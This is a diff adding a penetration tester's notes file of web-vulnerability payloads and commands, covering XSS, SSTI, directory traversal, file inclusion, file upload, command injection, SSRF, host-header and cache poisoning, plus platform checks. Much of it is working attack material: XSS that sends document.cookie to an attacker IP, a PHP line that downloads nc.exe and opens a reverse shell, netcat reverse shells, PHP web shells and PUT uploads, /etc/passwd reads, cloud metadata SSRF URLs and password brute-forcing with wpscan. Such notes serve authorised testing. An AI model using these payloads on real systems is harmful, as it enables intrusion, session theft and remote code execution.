@@ -1,0 +1,388 @@
+Web Vulnerabilities
+
+
+# Overview
+
+Common web vulnerability classes, payloads, and platform-specific checks.
+
+
+# Related Notes
+
+web-burp.txt         Repeater validation workflow
+databases.txt        SQL injection
+open-redirect.txt    Open redirect parameters and payloads
+web-apps.txt         Recon and enumeration commands
+web-auth.txt         Authentication and access-control testing
+
+
+# Cross-site Scripting (XSS)
+
+## Overview
+
+Untrusted input reaches the browser without encoding, allowing script execution in the victim's context.
+
+## Payloads / Techniques
+
+Reflected   injected via URL, form, or link
+Stored      persists on the server (comments, profiles, tickets)
+DOM-based   sinks such as eval(), innerHTML, document.write fed from location.hash or postMessage
+
+<script>alert(1)</script>
+<script>alert('xss')</script>
+<script>alert(document.cookie)</script>
+
+<iframe src="http://<attacker IP>/test.js" height="0" width="0"></iframe>
+<img src="http://<attacker IP>/test.png" onload="javascript:alert('xss')"/>
+<script>new Image().src="http://<attacker IP>/test.php?output="+document.cookie;</script>
+<iframe src="http://<attacker IP>" width="1" height="1"></iframe>
+
+Prevention: HttpOnly, Secure, Content-Security-Policy
+
+## Validation / False Positives
+
+View Source may not show DOM XSS — use Inspector and test in browser.
+Self-XSS without a delivery path to another user is usually out of scope.
+Confirm impact: cookie theft (if not HttpOnly), action performed, or session hijack.
+
+
+# Server-side Template Injection (SSTI)
+
+## Overview
+
+User input is embedded in a server-side template and evaluated by the template engine.
+
+## Payloads / Techniques
+
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+## Validation / False Positives
+
+49 in the response confirms evaluation — identify the engine before escalating to RCE payloads.
+A static {{variable}} echo from client-side JS is not SSTI.
+
+
+# Directory Traversal
+
+## Overview
+
+Read files outside the intended directory via unsanitized file path parameters.
+
+## Payloads / Techniques
+
+http://target.com/loadImage?filename=1
+
+Burp Proxy > step through load flow > Send to Repeater > modify path
+
+Linux
+    filename=/etc/passwd
+    filename=../../../etc/passwd
+    filename=....//....//....//etc/passwd
+    filename=..%252f..%252f..%252fetc/passwd
+    filename=/var/www/images/../../../etc/passwd
+    filename=../../../etc/passwd%00.png
+
+Windows
+    filename=\windows\win.ini
+    filename=..\..\..\windows\win.ini
+    filename=....\/....\/....\/windows\win.ini
+
+## Validation / False Positives
+
+Confirm recognizable file contents (root:x:0:0, [fonts]) in the response body.
+Error messages mentioning /etc/passwd are not proof of read access.
+
+
+# Local File Inclusion
+
+## Overview
+
+Include local files through a dynamic page parameter (page=, file=, template=).
+
+## Payloads / Techniques
+
+Linux:   http://target.com/index.php?page=../../../etc/passwd
+Windows: http://target.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+LFI to SMB / NTLM capture:
+cd /opt/Responder
+python3 Responder.py -I eth0
+http://target.com/index.php?page=//<attacker IP>/test
+
+## Validation / False Positives
+
+PHP wrappers (php://filter) may be needed when plain paths are blocked — confirm readable source or file content.
+
+
+# Remote File Inclusion
+
+## Overview
+
+Include a remote resource controlled by the attacker.
+
+## Payloads / Techniques
+
+http://target.com/index.php?page=http://<attacker IP>/test.txt
+
+<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
+
+## Validation / False Positives
+
+Confirm your server receives HTTP requests from the target when testing with a URL you control.
+
+
+# Unrestricted File Upload and PUT
+
+## Overview
+
+Upload or PUT endpoints that accept dangerous file types or write to executable paths.
+
+## Commands
+
+cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/test.php
+Modify: $ip = '<attacker IP>';
+Upload the file.
+nc -lvnp 1234
+firefox http://<target IP>/uploads/test.php
+
+curl -ikL -T shell.php http://target.com/shell.php
+curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
+
+Upload read.php: <?php echo file_get_contents('/etc/passwd'); ?>
+Upload command.php: <?php echo system($_GET['command']); ?>
+
+Bypass filtering:
+    Content-Type: image/jpeg
+    Filename: shell.php%00.jpg
+    Polyglot: exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" photo.jpg -o polyglot.php
+
+## Validation / False Positives
+
+Confirm execution or file read — not merely that the upload returned 200.
+Find the uploaded path with directory brute force if the app does not return the URL.
+
+
+# Command Injection
+
+## Overview
+
+User input passed to OS commands without sanitization.
+
+## Payloads / Techniques
+
+http://target.com/test.php?cmd=whoami
+http://target.com/test.php?cmd=nc -e /bin/sh <attacker IP> 443
+
+;ls -la
+&&ls -la
+&&{ls,-la}
+
+<?php echo system($_GET["cmd"]);?>
+
+## Validation / False Positives
+
+Time-based payloads (sleep 5) help on blind injection.
+Distinguish shell execution from static error pages mentioning "command".
+
+
+# SSRF
+
+## Overview
+
+Server-Side Request Forgery — the server makes outbound requests to attacker-chosen targets.
+
+## Payloads / Techniques
+
+http://127.0.0.1/
+http://localhost/
+http://169.254.169.254/latest/meta-data/          AWS metadata
+http://metadata.google.internal/computeMetadata/v1/  GCP metadata
+http://[::1]/
+http://127.1/
+file:///etc/passwd
+
+Bypass filters: alternate IP encoding, DNS to 127.0.0.1, redirect chains, @ in URL
+
+## Commands
+
+Identify url=, uri=, path=, dest=, webhook=, fetch= parameters.
+Burp Collaborator or netcat listener on <attacker IP>.
+Send Repeater requests with internal and metadata URLs; watch for callbacks or response differences.
+
+## Validation / False Positives
+
+A DNS lookup to your collaborator confirms blind SSRF.
+An open port on 127.0.0.1 is not impact by itself — show access to metadata, admin interface, or sensitive internal content.
+
+
+# Host Header Injection
+
+## Overview
+
+The application trusts the Host header for redirects, links, password reset, or cache keys.
+
+## Payloads / Techniques
+
+Host: evil.com
+Host: target.com\r\nX-Forwarded-Host: evil.com
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+
+## Commands
+
+curl -ik "https://target.com/" -H "Host: evil.com"
+Burp > Repeater > modify Host and X-Forwarded-* headers on password-reset and redirect endpoints.
+
+## Validation / False Positives
+
+Confirm evil.com appears in a reset link, Location header, or emailed content — not only in static error pages.
+
+
+# Web Cache Poisoning
+
+## Overview
+
+Unkeyed headers or parameters influence cached responses served to other users.
+
+## Payloads / Techniques
+
+X-Forwarded-Host: evil.com
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+## Commands
+
+Identify unkeyed inputs with Param Miner (Burp BApp) or manual header fuzzing.
+Send two requests: one with poison header, one without — same cache key path.
+Verify the second client receives the poisoned response.
+
+## Validation / False Positives
+
+CDN must actually cache the response — check Cache-Control, Age, and X-Cache headers.
+
+
+# Open Redirect
+
+## Overview
+
+User-controlled redirect targets send victims to external sites. See open-redirect.txt for full payload lists.
+
+## Commands
+
+Identify redirect, return, next, url, goto, and continue parameters.
+Burp > Repeater > set parameter to https://<attacker domain> or //<attacker domain>
+Follow the 302 chain in Repeater or browser.
+
+## Validation / False Positives
+
+A redirect to /login is not an open redirect.
+Confirm the final Location reaches an external domain you control.
+
+
+# SQL Injection
+
+## Overview
+
+See databases.txt for payloads and exploitation techniques.
+
+## Validation / False Positives
+
+A single 500 on a quote probe needs a reproducible error, boolean change, or extracted data to confirm.
+
+
+# XML Injection
+
+## Overview
+
+Unsanitized XML input leading to injection, XXE, or schema validation errors.
+
+## Payloads / Techniques
+
+Single quote        foo'
+Double quote        foo"
+Greater than        foo>
+Less than           foo<
+Comment tag         foo<!--
+Ampersand           &foo
+
+## Validation / False Positives
+
+Schema namespace strings in the response (http://www.w3.org/2001/XMLSchema) are usually false positives.
+
+
+# Remote Code Execution
+
+## Payloads / Techniques
+
+<?php system("nc 192.168.1.5 443 -e /bin/bash")?>
+
+
+# URL Encoding
+
+Reserved characters     @ $ & + = ; : , / ?
+Unsafe characters       space " < > # % { } | \ ^ ~ [ ] `
+
+%20 space   %2E .   %2F /   %23 #   %3F ?
+%26 &       %25 %   %2B +   %40 @   %27 '
+%22 "       %3C <   %3E >
+
+Example: <script>alert(document.cookie);</script>
+Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
+
+
+# Check for Error Handling
+
+## Commands
+
+Add junk to the middle of a URL.
+Add a single tick (') at the end of a URL.
+Enter a single tick (') in any input field of a form and submit.
+
+## Validation / False Positives
+
+Generic 404 pages differ from stack traces — capture the response body as evidence.
+
+
+# Platform Checks
+
+## Cisco Router
+
+x is between 15 and 99.
+https://target.com/level/x/exec/-/show
+
+## ColdFusion
+
+/CFIDE/administrator/
+/CFIDE/debug/cf_debugFr.cfm
+/CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
+/debug/cf_debugFr.cfm
+
+## Jenkins
+
+root:password
+https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution
+https://github.com/gquere/pwn_jenkins
+
+Script Console reverse shell at /script — see HackTricks for payload.
+nc -lvnp 8000
+
+## WebDAV
+
+msfconsole
+use auxiliary/scanner/http/webdav_scanner
+./davtest.pl -url http://target.com
+while read -r i; do cadaver -t "$i"; done < 80.txt
+
+## WordPress
+
+wpscan --url https://target --enumerate p,t,u
+wpscan --url https://target -U users.txt -P passwords.txt
+
+## Validation / False Positives
+
+Nikto and wpscan findings require manual confirmation in the browser or Repeater.
+A exposed /CFIDE path still needs evidence of access or sensitive data.
